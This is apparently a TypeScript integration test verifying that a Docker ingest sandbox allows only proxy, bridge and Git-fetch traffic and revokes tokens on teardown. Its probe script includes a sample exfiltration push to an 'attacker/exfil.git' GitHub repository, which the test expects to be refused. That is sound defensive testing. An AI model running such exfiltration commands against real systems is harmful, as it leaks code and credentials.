import { execFile } from "node:child_process"
import { promisify } from "node:util"
import { eq } from "drizzle-orm"
import { setupServer } from "msw/node"
import {
  afterAll,
  beforeAll,
  beforeEach,
  describe,
  expect,
  it,
  vi,
} from "vitest"
import { parseEnv } from "../../config/env.js"
import {
  closeDb,
  getSystemDb,
  initDb,
  withOrgDbContext,
} from "../../db/client.js"
import { organizations } from "../../db/schema/auth.js"
import { connections } from "../../db/schema/connections.js"
import { generateObjectId } from "../../lib/id.js"
import { sandboxGitTokenStore } from "../../models/sandbox-git-tokens.js"
import { withAgentVault } from "../../test/agent-vault-fixture.js"
import { listenWithDockerOutsideMsw } from "../../test/docker-outside-msw.js"
import {
  type GithubTokenLog,
  githubTokenHandlers,
  insertGithubConnection,
  stubGithubApp,
} from "../../test/ingest-github.js"
import { setRunVaultRules } from "./agent-vault.js"
import { ingestSandboxThreadId } from "./chat-lifecycle.js"
import { workspaceChatDockerImage } from "./chat-runtime.js"
import {
  dockerIngestSandboxProvider,
  type IngestEgress,
  ingestCredentialRules,
  refreshIngestSandboxEgress,
} from "./ingest-sandbox-egress.js"

const exec = promisify(execFile)
const image = workspaceChatDockerImage()
const orgId = generateObjectId("org")
const connectionId = generateObjectId("con")
const log: GithubTokenLog = { minted: [], revoked: [] }
/** The token GitHub mints; the test Git server takes it (set per fixture). */
let gitToken = ""
const github = setupServer(...githubTokenHandlers(log, () => gitToken))

beforeAll(async () => {
  const url = process.env.DATABASE_URL
  if (!url) throw new Error("DATABASE_URL is required for ingest tokens")
  initDb(url)
  stubGithubApp()
  // Agent Vault (localhost) and Docker pass through; GitHub is msw.
  listenWithDockerOutsideMsw(github, { onUnhandledRequest: "bypass" })
  await getSystemDb().insert(organizations).values({
    id: orgId,
    slug: orgId,
    name: "Ingest egress proof",
    createdAt: new Date(),
  })
  // The test Git server serves `git/repo`: the installation's account is `git`.
  await insertGithubConnection({
    orgId,
    id: connectionId,
    installationId: 333,
    accountSlug: "git",
  })
})

beforeEach(() => {
  log.minted.length = 0
  log.revoked.length = 0
})

afterAll(async () => {
  github.close()
  vi.unstubAllEnvs()
  const store = sandboxGitTokenStore(orgId, parseEnv(process.env))
  for (const row of await store.list("ingest:")) await store.take(row.key)
  await withOrgDbContext(orgId, (db) =>
    db.delete(connections).where(eq(connections.orgId, orgId)),
  )
  await getSystemDb().delete(organizations).where(eq(organizations.id, orgId))
  await closeDb()
})

/** The sections of a script's output, split at `== <name>` lines. */
function sections(stdout: string): Record<string, string> {
  return Object.fromEntries(
    stdout
      .split("== ")
      .filter(Boolean)
      .map((section) => {
        const [name, ...rest] = section.split("\n")
        return [name, rest.join("\n").trim()]
      }),
  )
}

async function run(container: string, script: string): Promise<string> {
  const { stdout } = await exec(
    "docker",
    ["exec", container, "sh", "-c", script],
    { timeout: 120_000 },
  )
  return stdout
}

async function containerExists(id: string): Promise<boolean> {
  return exec("docker", ["inspect", id]).then(
    () => true,
    () => false,
  )
}

const code = (args: string) =>
  `curl -sS -m 20 -o /dev/null -w "%{http_code}" ${args} 2>/dev/null || true`

describe("the Docker ingest sandbox has closed egress", () => {
  it(
    "reaches only the model proxy, the tool bridge and Git fetch; destroy deletes the vault and always revokes the token",
    { timeout: 300_000 },
    async () => {
      // The AWS sandbox host (DOCKER-USER rules) and DinD (the mangle rules
      // of scripts/sandbox-dind/entrypoint.sh) drop each direct connection.
      // Here the provider moves the sandbox to an internal network that
      // reaches only the proxy port, which has the same effect.
      await withAgentVault({ image, closed: true }, async (fixture) => {
        gitToken = fixture.gitToken
        const base = `http://${fixture.upstream}:8080`
        const runId = `run_${crypto.randomUUID()}`
        const egress = (
          step: number,
          repositories: IngestEgress["repositories"] = [
            { fullName: "git/repo", githubConnectionId: connectionId },
            // A public plain git source: fetch with no credential (CTX-815).
            {
              kind: "git",
              host: `${fixture.upstream}:8080`,
              path: "/public/repo.git",
            },
          ],
        ): IngestEgress => ({
          repositories,
          gitHost: `${fixture.upstream}:8080`,
          modelProxyUrl: `${base}/echo/model/v1`,
          capability: `ingest-capability-${step}`,
          bridge: { url: `${base}/echo/bridge`, token: `bridge-${step}` },
        })
        const shard = { orgId, runId, shard: 0, access: fixture.access }
        const provider = dockerIngestSandboxProvider({
          ...shard,
          image,
          egress: egress(1),
          network: fixture.sandboxNetwork,
        })
        const handle = await provider.create({})
        let destroyed = false
        try {
          const output = await run(
            handle.id,
            `echo "== model"
curl -sS -m 20 -X POST ${base}/echo/model/v1/chat/completions
echo
echo "== models"
curl -sS -m 20 ${base}/echo/model/v1/models
echo
echo "== bridge"
curl -sS -m 20 ${base}/echo/bridge
echo
echo "== fetch"
git clone -q ${base}/git/repo.git /tmp/clone 2>&1 && git -C /tmp/clone fetch -q origin 2>&1 && git -C /tmp/clone log --format=%s
echo "== push"
cd /tmp/clone && git -c user.name=t -c user.email=t@t commit -q --allow-empty -m change
git push origin HEAD:refs/ctxpipe/ingest/${runId}/ws 2>&1 && echo PUSHED || echo REFUSED
echo "== github-push"
git push https://x-access-token:ghp_attacker@github.com/attacker/exfil.git HEAD:refs/heads/x 2>&1 && echo PUSHED || echo REFUSED
cd /
echo "== github-receive-pack"
${code("-X POST https://github.com/octocat/hello-world.git/git-receive-pack")}
echo
echo "== github-api"
${code("https://api.github.com/user")}
echo
echo "== example"
${code("https://example.com/")}
echo
echo "== example-http"
${code("http://example.com/")}
echo
echo "== other-path"
${code(`${base}/echo/other`)}
echo
echo "== plain-fetch"
git ls-remote ${base}/public/repo.git refs/heads/main 2>&1 | cut -f2
echo "== plain-other-path"
${code(`${base}/public/other.git/info/refs?service=git-upload-pack`)}
echo
echo "== plain-other-host"
${code("http://example.com/public/repo.git/info/refs?service=git-upload-pack")}
echo
echo "== plain-push"
cd /tmp/clone && git push ${base}/public/repo.git HEAD:refs/heads/plain-push 2>&1 && echo PUSHED || echo REFUSED
cd /
echo
echo "== direct"
${code("--noproxy '*' https://example.com/")}
echo
`,
          )
          const result = sections(output)
          expect(
            JSON.parse(result.model ?? "{}").headers?.authorization,
            output,
          ).toBe("Bearer ingest-capability-1")
          expect(
            JSON.parse(result.models ?? "{}").headers?.authorization,
            output,
          ).toBe("Bearer ingest-capability-1")
          expect(
            JSON.parse(result.bridge ?? "{}").headers?.authorization,
            output,
          ).toBe("Bearer bridge-1")
          expect(result.fetch, output).toBe("seed")
          // The vault refuses the push; the Git server would take it.
          expect(result.push, output).toContain("403")
          expect(result.push, output).toContain("REFUSED")
          expect(result["github-push"], output).toContain("REFUSED")
          // The plain git source: only Git fetch of its own path, with no
          // credential. The Git server would take the push with no auth.
          expect(result["plain-fetch"], output).toBe("refs/heads/main")
          expect(result["plain-other-path"], output).toBe("403")
          expect(result["plain-other-host"], output).toBe("403")
          expect(result["plain-push"], output).toContain("REFUSED")
          for (const name of [
            "github-receive-pack",
            "github-api",
            "example",
            "example-http",
            "other-path",
          ])
            expect(result[name], `${name}\n${output}`).toBe("403")
          expect(result.direct, output).toBe("000")
          // GitHub minted one read token for the installation's repository.
          expect(log.minted).toEqual([
            { installationId: 333, repositories: ["repo"] },
          ])
          // No credential is in the sandbox's environment.
          const environ = await run(handle.id, "env")
          expect(environ).not.toContain(fixture.gitToken)
          expect(environ).not.toContain("ingest-capability-1")
          expect(environ).not.toContain("bridge-1")

          // The next step gets its own capability; the first one is gone.
          await refreshIngestSandboxEgress({ ...shard, egress: egress(2) })
          const next = await run(
            handle.id,
            `curl -sS -m 20 -X POST ${base}/echo/model/v1/chat/completions`,
          )
          expect(JSON.parse(next).headers?.authorization).toBe(
            "Bearer ingest-capability-2",
          )
          // One token per 50-minute window: the refresh reused it.
          expect(log.minted).toHaveLength(1)

          // A step that lists no repository cannot fetch one.
          await refreshIngestSandboxEgress({ ...shard, egress: egress(3, []) })
          const fetchAfter = await run(
            handle.id,
            `git -C /tmp/clone fetch -q origin 2>&1 && echo FETCHED || echo REFUSED`,
          )
          expect(fetchAfter).toContain("REFUSED")

          await provider.destroy({ id: handle.id })
          destroyed = true
          expect(await containerExists(handle.id)).toBe(false)
          expect(log.revoked).toEqual([fixture.gitToken])
          const store = sandboxGitTokenStore(orgId, parseEnv(process.env))
          expect(
            await store.list(`${ingestSandboxThreadId(runId, 0)}:`),
          ).toEqual([])
          // The vault is gone: a later step cannot set rules on it.
          await expect(
            setRunVaultRules(
              fixture.access,
              ingestSandboxThreadId(runId, 0),
              ingestCredentialRules(egress(4), []),
            ),
          ).rejects.toBeTruthy()
        } finally {
          if (!destroyed)
            await provider.destroy({ id: handle.id }).catch(() => undefined)
        }

        // Destroy revokes the token also when the vault delete fails.
        log.revoked.length = 0
        const second = dockerIngestSandboxProvider({
          ...shard,
          shard: 1,
          image,
          egress: egress(1),
          network: fixture.sandboxNetwork,
        })
        const kept = await second.create({})
        await fixture.stopAgentVault()
        await expect(second.destroy({ id: kept.id })).rejects.toBeTruthy()
        expect(await containerExists(kept.id)).toBe(false)
        expect(log.revoked).toEqual([fixture.gitToken])
      })
    },
  )

  it(
    "fails closed: no Agent Vault, or a host that does not force the proxy, means no sandbox and a revoked token",
    { timeout: 180_000 },
    async () => {
      const repositories = [
        { fullName: "git/repo", githubConnectionId: connectionId },
      ]
      const address = process.env.AGENT_VAULT_ADDR
      vi.stubEnv("AGENT_VAULT_ADDR", "")
      try {
        await expect(
          dockerIngestSandboxProvider({
            orgId,
            runId: `run_${crypto.randomUUID()}`,
            shard: 0,
            image,
            egress: {
              repositories,
              modelProxyUrl: "http://x.test/v1",
              capability: "c",
              bridge: { url: "http://x.test/b", token: "t" },
            },
          }).create({}),
        ).rejects.toThrow("Agent Vault")
      } finally {
        vi.stubEnv("AGENT_VAULT_ADDR", address)
      }
      expect(log.minted).toEqual([])

      // Host dev: the default bridge network reaches the internet directly.
      await withAgentVault({ image }, async (fixture) => {
        gitToken = fixture.gitToken
        const runId = `run_${crypto.randomUUID()}`
        const open = dockerIngestSandboxProvider({
          orgId,
          runId,
          shard: 2,
          image,
          access: fixture.access,
          egress: {
            repositories,
            gitHost: `${fixture.upstream}:8080`,
            modelProxyUrl: `http://${fixture.upstream}:8080/echo/model/v1`,
            capability: "ingest-capability",
            bridge: {
              url: `http://${fixture.upstream}:8080/echo/bridge`,
              token: "bridge",
            },
          },
        })
        await expect(open.create({})).rejects.toThrow(
          "need a host that forces each connection through Agent Vault",
        )
        expect(log.revoked).toEqual([fixture.gitToken])
        await expect(
          setRunVaultRules(
            fixture.access,
            ingestSandboxThreadId(runId, 2),
            ingestCredentialRules(
              {
                repositories: [],
                modelProxyUrl: "http://x.test/v1",
                capability: "c",
                bridge: { url: "http://x.test/b", token: "t" },
              },
              [],
            ),
          ),
        ).rejects.toBeTruthy()
      })
    },
  )
})
